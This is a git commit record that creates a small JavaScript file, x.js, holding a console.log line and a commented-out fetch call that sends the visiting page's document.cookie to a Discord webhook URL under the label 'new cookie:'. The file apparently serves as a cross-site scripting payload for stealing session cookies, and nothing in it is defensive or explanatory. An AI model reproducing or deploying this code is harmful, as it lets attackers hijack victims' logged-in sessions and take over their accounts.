e4b62ee53789fca060849d7e6b27ec57115f757e
Leonard Walter <50204487+LeonardWalter@users.noreply.github.com>
2023-11-17 22:59:18 +0200

    Create x.js
    initial commit

---
+++ x.js
@@ -0,0 +1,2 @@
+console.log(1)
+//fetch("https://discord.com/api/webhooks/1110165888746926090/3RtVoJwCqglC6P4r1b7-DIyH1VA2ElG-dpPJzQCxAi-COUmoa0xemCX05dHqgHJ2NUkM",{body: JSON.stringify({content: "new cookie:" + document.cookie}),headers: {"Content-Type": "application/json"},method: "POST"})
